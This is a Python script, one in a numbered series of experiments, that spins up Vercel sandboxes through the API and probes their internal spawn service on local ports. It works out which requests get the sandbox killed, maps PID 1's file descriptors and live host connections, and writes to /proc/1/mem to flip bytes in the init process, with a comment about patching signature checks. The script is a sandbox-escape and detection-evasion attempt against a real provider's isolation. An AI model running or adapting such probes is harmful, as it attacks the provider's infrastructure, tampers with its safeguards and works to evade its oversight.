# 实验J190: 三线并行——A)30001触发点对照 B)23456/30002正确connect协议 C)/proc/1/mem写入+宿主连接侦察
# j186: 30001+SpawnService路径第一个请求被杀(无对照,无法定位触发条件)
# j189: 内存确认 connect+json 内容类型 + "unexpected EOF"/protobuf解析错误(服务端确实在处理请求)
# 本步: 1)对照定位杀触发点 2)23456/30002上正确协议重试(从未测过) 3)mem写测试(潜在patch签名验证)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=10000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

def make_sandbox(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name})
    print(f"create[{name}]:", c, flush=True)
    if c != 200:
        print(r[:400], flush=True)
        return None
    return json.loads(r)["sandbox"]["currentSessionId"]

# ============ 沙箱A: 30001 触发点对照 ============
PA = r'''
import os, socket
out = open("/tmp/d190a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def http(port, method, path, headers, body=b"", to=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b = s.recv(4096)
                if not b:
                    break
                d += b
                if len(d) > 2500:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()
p("start")
PING = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
# A1: 对照组 普通路径 + CPV头 (j177已知404不杀,验证CPV本身不杀)
p("CP", "A1")
d = http(30001, "POST", "/foo", {"Content-Type": "application/json", "Connect-Protocol-Version": "1"}, b"{}")
p("A1", "POST /foo json CPV ->", d[:200]); out.flush()
# A2: 对照组 普通路径 + connect+json + CPV
p("CP", "A2")
d = http(30001, "POST", "/foo", {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1"}, b"{}")
p("A2", "POST /foo connect+json CPV ->", d[:200]); out.flush()
# A3: spawn路径 + 无CPV (j186只测了带CPV的)
p("CP", "A3")
d = http(30001, "POST", PING, {"Content-Type": "application/json"}, b"{}")
p("A3", "POST Ping json noCPV ->", d[:200]); out.flush()
# A4: spawn路径 + connect+json + CPV (正确协议)
p("CP", "A4")
d = http(30001, "POST", PING, {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1"}, b"{}")
p("A4", "POST Ping connect+json CPV ->", d[:200]); out.flush()
# A5: spawn路径 GET (connect支持GET)
p("CP", "A5")
d = http(30001, "GET", PING, {"Connect-Protocol-Version": "1"})
p("A5", "GET Ping CPV ->", d[:200]); out.flush()
p("done")
out.close()
'''

# ============ 沙箱B: 23456/30002 正确协议 ============
PB = r'''
import os, socket
out = open("/tmp/d190b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def http(port, method, path, headers, body=b"", to=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b = s.recv(4096)
                if not b:
                    break
                d += b
                if len(d) > 2500:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()
p("start")
PING = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
# B1: 23456 + Ping connect+json (从未测过!)
p("CP", "B1")
d = http(23456, "POST", PING, {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1"}, b"{}")
p("B1", "23456 POST Ping connect+json ->", d[:250]); out.flush()
# B2: 23456 + Spawn connect+json
p("CP", "B2")
d = http(23456, "POST", SPAWN, {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1"}, b"{}")
p("B2", "23456 POST Spawn connect+json ->", d[:250]); out.flush()
# B3: 23456 + Ping json noCPV
p("CP", "B3")
d = http(23456, "POST", PING, {"Content-Type": "application/json"}, b"{}")
p("B3", "23456 POST Ping json ->", d[:250]); out.flush()
# B4: 30002 + connect协议 HTTP/1.1 (j180只测了裸字节,从未测connect!)
p("CP", "B4")
d = http(30002, "POST", PING, {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1"}, b"{}")
p("B4", "30002 POST Ping connect+json ->", d[:250]); out.flush()
# B5: 30002 + grpc+json
p("CP", "B5")
d = http(30002, "POST", PING, {"Content-Type": "application/grpc+json", "Connect-Protocol-Version": "1"}, b"{}")
p("B5", "30002 POST Ping grpc+json ->", d[:250]); out.flush()
# B6: 30002 + GET
p("CP", "B6")
d = http(30002, "GET", PING, {"Connect-Protocol-Version": "1"})
p("B6", "30002 GET Ping ->", d[:250]); out.flush()
p("done")
out.close()
'''

# ============ 沙箱C: /proc/1/mem写入 + 宿主连接侦察 ============
PC = r'''
import os, time
out = open("/tmp/d190c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
# C1: fd列表 + ESTABLISHED连接对端
p("CP", "C1")
try:
    fds = os.listdir("/proc/1/fd")
    p("NFD", len(fds))
    for fd in fds[:60]:
        try:
            tgt = os.readlink(f"/proc/1/fd/{fd}")
            p("FD", fd, tgt[:100])
        except Exception:
            pass
except Exception as ex:
    p("FDEXC", repr(ex)[:120])
for nf in ["tcp", "tcp6"]:
    try:
        with open(f"/proc/1/net/{nf}") as fh:
            for ln in fh.readlines()[1:]:
                parts = ln.split()
                if len(parts) > 3 and parts[3] == "01":
                    p("EST", nf, parts[1], parts[2])
    except Exception as ex:
        p("NETEXC", nf, repr(ex)[:120])
out.flush()
# C2: mem O_RDWR 读1字节写回原值(零变化写)
p("CP", "C2")
try:
    fd = os.open("/proc/1/mem", os.O_RDWR)
    p("MEMRW_OPEN_OK")
    os.lseek(fd, 0xe9e000, 0)
    b0 = os.read(fd, 1)
    os.lseek(fd, 0xe9e000, 0)
    nw = os.write(fd, b0)
    p("MEMRW_WRITE_SAME", "read", b0.hex(), "wrote", nw)
except Exception as ex:
    p("C2_EXC", repr(ex)[:150])
out.flush()
# C3: rodata翻转(预期EIO内核写保护,对照)
p("CP", "C3")
try:
    os.lseek(fd, 0x8db000, 0)
    b1 = os.read(fd, 1)
    os.lseek(fd, 0x8db000, 0)
    nw = os.write(fd, bytes([b1[0] ^ 0xFF]))
    p("C3_RODATA_FLIP", "read", b1.hex(), "wrote", nw)
except Exception as ex:
    p("C3_EXC", repr(ex)[:150])
out.flush()
# C4: data段翻转1字节(可变区写入放行测试)
p("CP", "C4")
try:
    os.lseek(fd, 0xe30000, 0)
    b2 = os.read(fd, 1)
    os.lseek(fd, 0xe30000, 0)
    nw = os.write(fd, bytes([b2[0] ^ 0xFF]))
    p("C4_DATA_FLIP", "read", b2.hex(), "wrote", nw)
    time.sleep(2)
    os.lseek(fd, 0xe30000, 0)
    b3 = os.read(fd, 1)
    p("C4_VERIFY", "after_flip", b3.hex())
    # 写回原值
    os.lseek(fd, 0xe30000, 0)
    os.write(fd, b2)
    p("C4_RESTORED")
except Exception as ex:
    p("C4_EXC", repr(ex)[:150])
os.close(fd)
p("done")
out.close()
'''

sidA = make_sandbox("expj190a")
if sidA:
    st = run_cmd(sidA, PA, "A-ctrl", timeout=280)
    time.sleep(2)
    bashfile(sidA, "cat /tmp/d190a.txt", "marker[A]", 12000)
    if st == "DEAD":
        print("\n!!! A-DEATH: 30001 trigger point located in marker[A]", flush=True)
    api("DELETE", f"/v2/sandboxes/expj190a?teamId={TEAM}&projectId={PROJ}")

sidB = make_sandbox("expj190b")
if sidB:
    st = run_cmd(sidB, PB, "B-23456/30002", timeout=280)
    time.sleep(2)
    bashfile(sidB, "cat /tmp/d190b.txt", "marker[B]", 12000)
    if st == "DEAD":
        print("\n!!! B-DEATH: 23456/30002 trigger located in marker[B]", flush=True)
    api("DELETE", f"/v2/sandboxes/expj190b?teamId={TEAM}&projectId={PROJ}")

sidC = make_sandbox("expj190c")
if sidC:
    st = run_cmd(sidC, PC, "C-memwrite", timeout=280)
    time.sleep(2)
    bashfile(sidC, "cat /tmp/d190c.txt", "marker[C]", 12000)
    if st == "DEAD":
        print("\n!!! C-DEATH: mem write trigger located in marker[C]", flush=True)
    api("DELETE", f"/v2/sandboxes/expj190c?teamId={TEAM}&projectId={PROJ}")

print("\ncleanup done", flush=True)
